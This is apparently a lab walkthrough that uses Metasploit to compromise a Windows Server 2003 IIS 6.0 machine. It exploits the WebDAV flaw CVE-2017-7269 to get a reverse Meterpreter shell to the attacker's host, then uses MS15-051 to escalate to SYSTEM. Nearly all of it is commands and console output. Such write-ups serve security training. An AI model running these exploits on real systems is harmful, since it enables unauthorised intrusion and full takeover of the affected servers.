
Searching for `IIS 6.0` shows potential modules
```
Description:
  Buffer overflow in the ScStoragePathFromUrl function
  in the WebDAV service in Internet Information Services (IIS) 6.0
  in Microsoft Windows Server 2003 R2 allows remote attackers to
  execute arbitrary code via a long header beginning with
  "If: <http://" in a PROPFIND request, as exploited in the
  wild in July or August 2016.

  Original exploit by Zhiniang Peng and Chen Wu.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2017-7269
  http://www.securityfocus.com/bid/97127
  https://github.com/edwardz246003/IIS_exploit
  https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html

Also known as:
  EXPLODINGCAN

```

##  CVE-2017-7269 (Exploding Can)
```
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.15:1030) at 2025-09-10 09:47:24 -0600

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 3856 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
c:\windows\system32\inetsrv>whoami 
whoami 
nt authority\network service

```

## Running Exploit suggester
Don't have privs to access `C:\Documents and Settings\Lakis`, so poking around.
```
meterpreter > run post/multi/recon/local_exploit_suggester 
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.10.10.15 - 206 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.15 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
<SNIP>
```

## Migrating to a stable process
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
<SNIP>
 1612  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 1780  392   dllhost.exe
 1896  392   alg.exe
 1908  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2556  584   wmiprvse.exe
 2752  344   logon.scr
 3192  1504  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3720  3192  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3856  3720  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 3992  1072  cidaemon.exe
 4040  1072  cidaemon.exe
 4064  1072  cidaemon.exe

meterpreter > migrate 1612
[*] Migrating from 3720 to 1612...
[*] Migration completed successfully.

```
## Background current session
```
meterpreter > background
[*] Backgrounding session 2...
msf exploit(windows/local/ms15_051_client_copy_image) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANNY  10.10.14.8:4444 -> 10.10.10.15:1032 (10.10.10.15)

```

## CVE-2015-1701
```
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use exploit/windows/local/ms15_051_client_copy_image 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
LHOST => 10.10.14.8
msf exploit(windows/local/ms15_051_client_copy_image) > set SESSION 2
SESSION => 2

msf exploit(windows/local/ms15_051_client_copy_image) > run
[*] Started reverse TCP handler on 10.10.14.8:1337 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 3948 launched.
[*] Reflectively injecting the DLL into 3948...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.15
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 3 opened (10.10.14.8:1337 -> 10.10.10.15:1033) at 2025-09-10 11:36:17 -0600

meterpreter > shell
Process 2296 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system


```
